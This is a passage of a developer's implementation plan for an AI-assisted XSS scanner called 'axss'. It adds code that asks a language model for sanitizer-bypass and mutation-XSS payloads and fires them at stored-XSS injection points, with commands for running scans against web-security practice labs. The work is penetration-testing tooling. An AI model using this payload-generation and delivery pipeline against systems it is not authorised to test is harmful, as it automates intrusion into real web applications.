- [ ] **Step 5: Complete the test implementations**

Read the existing `_run()` test harness in `test_active_worker_order.py` (the `test_normal_mode_uses_t0_probe_not_fast_omni` test) for the exact mock setup, then write the three T1 early exit tests fully.

- [ ] **Step 6: Run the new tests**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_active_worker_order.py -v -k "t1_skip or t1_fires or t3_scout_golden" 2>&1 | tail -20
```

Expected: All 3 pass.

- [ ] **Step 7: Run full test suite**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/ -x -q --ignore=tests/test_network_utils.py 2>&1 | tail -20
```

Expected: All tests pass.

- [ ] **Step 8: Commit**

```bash
cd /home/ryushe/tools/axss && git add ai_xss_generator/active/worker.py tests/test_active_worker_order.py
git commit -m "feat: add T1 early exit on 0-reflect pre-rank + golden seed fallback for T3-scout"
```

---

## Task 4: Deep Mode Stored Path

**Files:**
- Modify: `ai_xss_generator/models.py` (append `generate_deep_stored` after Task 2 additions)
- Modify: `ai_xss_generator/active/worker.py` (stored branch before T1 loop)
- Modify: `tests/test_active_worker_order.py` (add stored branch tests)

### Background

When `probe_result.discovery_style == "stored_get"`, the worker still dispatches all 1944 T1 candidates, each requiring two Playwright navigations (inject + follow-up URL check). This guarantees a 300s timeout. The fix: detect `_is_stored` per context, skip T1, fire 20-30 universal stored payloads directly, then escalate to `generate_deep_stored()` if all miss.

The executor's `fire(sink_url=...)` parameter is what drives follow-up navigation — the executor does NOT read `discovery_style`. So `sink_url` must be non-None for stored checks to work correctly.

### Worker timeout extension

Deep mode stored paths need more time. Before the context loop begins (around line 1265 where `param_variants` is iterated), find the `_timed_out` lambda. Currently in deep mode it references the 300s timeout. The spec says to extend to 600s for stored contexts. The simplest implementation: check `_is_stored` when computing each context's deadline. In practice this is complex to thread through. **Simplest safe approach**: extend the deep mode worker timeout globally from 300s to 600s when the probe result has `discovery_style == "stored_get"` for any param. Check how `start_time` and timeout are threaded from the caller before implementing.

Read how timeout is set:
```bash
grep -n "300\|timeout\|_timed_out" /home/ryushe/tools/axss/ai_xss_generator/active/worker.py | head -30
```

Then implement the timeout extension at the top of the GET worker function body (after `start_time` is received) as:
```python
# Extend timeout for stored XSS paths — each candidate needs inject + follow-up nav
_worker_timeout = 600.0 if (
    probe_results and any(
        getattr(r, "discovery_style", "") == "stored_get" for r in probe_results
    )
) else _worker_timeout  # keep whatever was passed in
```

(Note: implement this only AFTER reading the actual timeout mechanism in worker.py — the exact variable name and location may differ.)

### `generate_deep_stored` in `models.py`

Append after `generate_fast_seeded_batch` additions:

```python
def generate_deep_stored(
    cloud_model: str,
    param_name: str,
    context_type: str,
    follow_up_url: str,
    tried_payloads: list[str],
    *,
    count: int = 10,
    waf_hint: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 120,
) -> list[str]:
    """Generate targeted stored XSS payloads after universal payloads missed.

    Called when deep mode's stored universal payload sweep returns no confirms.
    Sends the tried payloads as negative examples and requests mutations.

    Returns list of payload strings (not PayloadCandidates). Returns [] on error.
    """
    tried_str = "\n".join(f"  {p}" for p in tried_payloads[:5])
    waf_line = f"\nKnown WAF: {waf_hint}" if waf_hint else ""

    prompt = (
        f"Stored XSS injection point detected.\n"
        f"Parameter: {param_name}\n"
        f"Context: {context_type}\n"
        f"Follow-up render URL: {follow_up_url}{waf_line}\n\n"
        f"These universal payloads were tried and did NOT execute:\n{tried_str}\n\n"
        f"The target stores the payload in a database and renders it on a separate page. "
        f"Stored XSS is typically less filtered than reflected. "
        f"Generate {count} targeted payloads. Focus on: HTML sanitizer bypasses, "
        f"mutation XSS (mXSS) tricks, filter evasion using entity encoding, "
        f"alternative execution sinks (SVG, MathML, details/summary). "
        f"Each payload must call alert(document.domain) or confirm(document.domain).\n"
        f'Return ONLY a JSON array of payload strings: ["payload1","payload2",...]'
    )

    system_msg = (
        "You are an expert offensive-security researcher specialising in stored XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON array."
    )

    resolved_model = cloud_model or OPENAI_FALLBACK_MODEL

    def _parse_response(content: str) -> list[str]:
        try:
            data = _extract_json_blob(content)
            if isinstance(data, list):
                return [str(p).strip() for p in data if str(p).strip()][:count]
            if isinstance(data, dict) and "payloads" in data:
                return [str(p).strip() for p in data["payloads"] if str(p).strip()][:count]
        except Exception:
            pass
        return []

    if ai_backend == "cli":
        try:
            from ai_xss_generator.cli_runner import generate_via_cli_with_tool
            raw, _used = generate_via_cli_with_tool(
                cli_tool, prompt, model=cli_model or None,
                timeout_seconds=request_timeout_seconds,
            )
            return _parse_response(raw.strip())
        except Exception as exc:
            log.debug("generate_deep_stored CLI error: %s", exc)
        return []

    from ai_xss_generator.config import load_api_key

    def _call_api(base_url: str, api_key: str, model: str) -> list[str]:
        headers: dict[str, str] = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }
        if "openrouter" in base_url:
            headers["HTTP-Referer"] = "https://github.com/axss"
            headers["X-Title"] = "axss"
        import requests as _req
        resp = _req.post(
            f"{base_url}/chat/completions",
            headers=headers,
            json={
                "model": model,
                "messages": [
                    {"role": "system", "content": system_msg},
                    {"role": "user",   "content": prompt},
                ],
                "temperature": 0.7,
            },
            timeout=max(1, request_timeout_seconds),
        )
        resp.raise_for_status()
        content = resp.json()["choices"][0]["message"]["content"]
        return _parse_response(content)

    api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if api_key:
        try:
            return _call_api(OPENROUTER_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_deep_stored OpenRouter error: %s", exc)

    api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if api_key:
        try:
            return _call_api(OPENAI_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_deep_stored OpenAI error: %s", exc)

    return []
```

### Stored branch in `worker.py`

The stored branch goes **inside the context loop**, right before the `if mode in ("normal", "deep") and context_type != "fast_omni"` T1 block (line 1319). It should only run in deep mode.

```python
                # ── Deep mode: stored XSS fast path ──
                # When probe detected stored XSS (canary found on a crawled page),
                # skip the 1944-candidate T1 Cartesian loop and fire a targeted
                # universal stored payload set instead. Much faster and more
                # appropriate — stored targets are less filtered than reflected.
                _is_stored = (
                    mode == "deep"
                    and context_probe_result is not None
                    and getattr(context_probe_result, "discovery_style", "") == "stored_get"
                )

                if _is_stored and not context_done and not _timed_out():
                    from ai_xss_generator.payloads.golden_seeds import stored_universal_payloads
                    _stored_payloads = stored_universal_payloads()
                    _stored_confirmed = False
                    _stored_tried: list[str] = []

                    _console.debug(
                        f"GET ?{_trunc(param_name, 20)} [{context_type}] "
                        f"Stored path: firing {len(_stored_payloads)} universal payloads"
                    )

                    for _sp in _stored_payloads:
                        if context_done or _timed_out():
                            break
                        _stored_tried.append(_sp)
                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=_sp,
                            all_params=flat_params,
                            transform_name="stored_universal",
                            sink_url=sink_url,
                        )
                        _ai_tried_payloads.append((_sp, "stored_universal"))
                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="stored_universal",
                                cloud_escalated=False,
                            )
                            if _record_context_finding(finding):
                                context_done = True
                                _v_steps.append("stored:universal-CONFIRMED")
                                break

                    if not context_done:
                        # Universal payloads all missed — escalate to AI with stored context
                        _v_steps.append("stored:universal-miss")
                        if use_cloud and not _timed_out():
                            from ai_xss_generator.models import generate_deep_stored
                            _stored_ai = generate_deep_stored(
                                cloud_model=cloud_model,
                                param_name=param_name,
                                context_type=context_type,
                                follow_up_url=sink_url or url,
                                tried_payloads=_stored_tried[:3],
                                waf_hint=waf_hint,
                                ai_backend=ai_backend,
                                cli_tool=cli_tool,
                                cli_model=cli_model,
                            )
                            for _sap in _stored_ai:
                                if context_done or _timed_out():
                                    break
                                total_transforms_tried += 1
                                result = executor.fire(
                                    url=url,
                                    param_name=param_name,
                                    payload=_sap,
                                    all_params=flat_params,
                                    transform_name="stored_ai",
                                    sink_url=sink_url,
                                )
                                _ai_tried_payloads.append((_sap, "stored_ai"))
                                if result.confirmed:
                                    finding = _make_finding(
                                        url=url,
                                        probe_result=context_probe_result,
                                        context_type=context_type,
                                        result=result,
                                        waf=waf_hint,
                                        source="stored_ai",
                                        cloud_escalated=True,
                                    )
                                    if _record_context_finding(finding):
                                        context_done = True
                                        _v_steps.append("stored:AI-CONFIRMED")
                                        break
                            if not context_done:
                                _v_steps.append("stored:AI-miss")

                    # Stored path handled — skip standard T1/T1.5/T3 pipeline
                    if _is_stored:
                        # Log -v summary and continue to next context
                        _v_summary = " → ".join(_v_steps) if _v_steps else "stored:no-steps"
                        _console.verbose(
                            f"GET ?{_trunc(param_name, 20)} [{context_type}] {_v_summary}"
                        )
                        continue  # next param_variants iteration
```

**Note on `continue`:** The `continue` skips the rest of the context loop body (T1, T1.5, T3-scout, seed pool updates) for this context. This is the correct behavior — stored contexts should not fall through to the reflected payload pipeline. Verify the indentation level matches the context loop (`for _pname, context_type, variants in param_variants`).

- [ ] **Step 1: Write the failing tests for stored branch**

Add to `tests/test_active_worker_order.py`:

```python
def test_stored_branch_fires_universal_payloads_not_t1(monkeypatch):
    """When discovery_style==stored_get in deep mode, universal payloads fire, T1 does not."""
    # Mock probe_url to return a ProbeResult with discovery_style="stored_get"
    # Mock executor.fire to return confirmed=False for universal, confirmed=True for second
    # Assert: fire() called with transform_name="stored_universal" not "tier1_deterministic"
    pass


def test_stored_branch_escalates_to_ai_when_universal_miss(monkeypatch):
    """When all universal payloads miss, generate_deep_stored is called."""
    # Mock probe_url → stored_get, executor.fire → confirmed=False always
    # Mock generate_deep_stored to return ["<test payload>"]
    # Assert: generate_deep_stored was called
    pass


def test_stored_branch_skips_in_normal_mode(monkeypatch):
    """Stored fast path is deep mode only — normal mode ignores discovery_style."""
    # Mock probe_param_context → stored_get discovery_style
    # But mode="normal" — standard T1 pipeline should fire
    # Assert: fire() called with transform_name="tier1_deterministic" (not stored_universal)
    pass
```

Write these tests using the same `_run()` harness pattern from the existing tests in the file.

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_active_worker_order.py -v -k "stored" 2>&1 | tail -20
```

Expected: 3 tests fail (stored branch not implemented yet).

- [ ] **Step 3: Add `generate_deep_stored` to `models.py`**

Append after the `generate_fast_seeded_batch` function (after the last line added in Task 2).

Use the `generate_deep_stored` function body from the "Background" section above.

- [ ] **Step 4: Run generate_deep_stored import test**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && python3 -c "from ai_xss_generator.models import generate_deep_stored; print('OK')"
```

Expected: `OK`

- [ ] **Step 5: Implement the timeout extension for stored contexts**

Read how the worker timeout is set before touching:
```bash
grep -n "_worker_timeout\|timeout_seconds\|300\|_timed_out" /home/ryushe/tools/axss/ai_xss_generator/active/worker.py | head -20
```

Then, inside `_run_get_worker` (the inner function), find where `_timed_out` is defined. Extend the timeout when any probe result has `discovery_style == "stored_get"`. Add **after** `probe_results` is assigned (~line 1122):

```python
                # Extend worker timeout for stored XSS — inject + follow-up navigation
                # per candidate doubles Playwright time vs reflected. Use 600s instead of 300s.
                if probe_results and any(
                    getattr(r, "discovery_style", "") == "stored_get" for r in probe_results
                ):
                    _stored_timeout = 600.0
                    _timed_out_orig = _timed_out
                    _timed_out = lambda: (time.time() - start_time) > _stored_timeout  # noqa: E731
```

**Note:** Read the actual `_timed_out` lambda definition first to match its exact pattern. The variable name and closure may differ. Verify with `grep -n "_timed_out" worker.py | head -10` before editing.

- [ ] **Step 6: Apply the stored branch to `worker.py`**

Insert the stored branch code block right before the `# ── Tier 1: deterministic context-specific payloads` comment at line 1313. Verify indentation — this is inside `for _pname, context_type, variants in param_variants:` loop, at the same indentation level as `_tier1_failed_payloads: list[str] = []`.

**Important:** The stored branch uses `follow_up_url=sink_url or url`. When `sink_url` is None but stored detection came from a crawled page (not a direct probe), the correct follow-up URL is the crawled page where the canary was found. Check `context_probe_result` for a page URL field (e.g., `context_probe_result.error` may encode it, or the `probe_result` may have a crawled-page attribute). For the initial implementation, `sink_url or url` is acceptable — but if integration testing (Task 5) shows stored payloads firing but not confirming, investigate this as the likely cause.

- [ ] **Step 7: Run stored tests**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_active_worker_order.py -v -k "stored" 2>&1 | tail -20
```

Expected: All 3 stored tests pass.

- [ ] **Step 8: Run full test suite**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/ -x -q --ignore=tests/test_network_utils.py 2>&1 | tail -20
```

Expected: All tests pass.

- [ ] **Step 9: Commit**

```bash
cd /home/ryushe/tools/axss && git add ai_xss_generator/models.py ai_xss_generator/active/worker.py tests/test_active_worker_order.py
git commit -m "feat: add deep mode stored XSS fast path with universal payloads + AI escalation"
```

---

## Task 5: Integration Verification

**Files:** Read-only — no code changes unless bugs found.

### Goal

Confirm that each improvement works end-to-end against real labs. This task is manual verification only — no tests to write, no code to change unless a bug is found.

### Labs to test

| Lab | URL pattern | What to verify |
|-----|------------|----------------|
| Fast mode basic | `https://0af0.web-security-academy.net/...` | Fast batch generates 7 batches, worker finds XSS |
| Normal mode filter lab | `https://euhyngyk.xssy.uk/...` lab 3 or 4 | Pre-rank 0/N → `T1:skip(0-reflect)` in `-v` output, T3-scout fires with golden seeds |
| Deep mode stored | A stored XSS lab | `stored:universal-CONFIRMED` or `stored:universal-miss → stored:AI-...` in `-v` output |

### Verification commands

```bash
# Fast mode — confirm "7 context-specific batches" message appears
source /home/ryushe/tools/axss/venv/bin/activate
python3 /home/ryushe/tools/axss/axss.py scan --fast -u "URL" -vv

# Normal mode filter bypass lab — look for T1:skip(0-reflect)
python3 /home/ryushe/tools/axss/axss.py scan -u "URL" -vv

# Deep mode stored — look for stored: tokens in -v output
python3 /home/ryushe/tools/axss/axss.py scan --deep -u "URL" -vv
```

### What success looks like

- **Fast mode**: `[*] Fast mode: generating payload library (7 context-specific batches)…` prints once. Workers receive ~56 payloads.
- **Normal mode filter lab**: `-vv` shows `Pre-rank: 0/10 reflect — T1 skipped`. `-v` summary includes `T1:skip(0-reflect)`. T3-scout fires and returns payloads.
- **Deep stored**: `-v` summary shows `stored:universal-CONFIRMED` (ideal) or `stored:universal-miss → stored:AI-CONFIRMED/miss` (acceptable). No 300s timeout.

- [ ] **Step 1: Run fast mode against a basic reflective lab**

```bash
source /home/ryushe/tools/axss/venv/bin/activate && python3 /home/ryushe/tools/axss/axss.py scan --fast -u "URL" -vv 2>&1 | head -30
```

- [ ] **Step 2: Run normal mode against a filter bypass lab**

Use lab 3 or lab 4 from xssy.uk (HTML Filter labs that previously timed out).

- [ ] **Step 3: Run deep mode against a stored XSS lab**

- [ ] **Step 4: If bugs found, fix and add regression tests**

Any bug found here should get a test case in `tests/test_active_worker_order.py` before fixing.

- [ ] **Step 5: Final commit if fixes were needed**

```bash
cd /home/ryushe/tools/axss && git add -p && git commit -m "fix: <describe bug>"
```

---

## Out of Scope

The following items are explicitly NOT covered by this plan (per spec):

- **POST worker stored path** — POST worker does not have T0 probe yet; stored detection for POST forms deferred
- **Normal mode stored XSS detection** — T0 is reflected-only by design; stored detection is deep mode only
- **`--interesting` crawl/AI implementation** — separate feature, tracked in `docs/superpowers/specs/future-active-recon-interesting.md`
- **WAF JS-challenge fallback for T0** — deferred to future work

---

## Final Verification

After all tasks complete:

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/ -q --ignore=tests/test_network_utils.py 2>&1 | tail -5
```

Expected output:
```
XXX passed in ...
```

Where `XXX` is the prior passing count + the new tests added in Tasks 1–4.
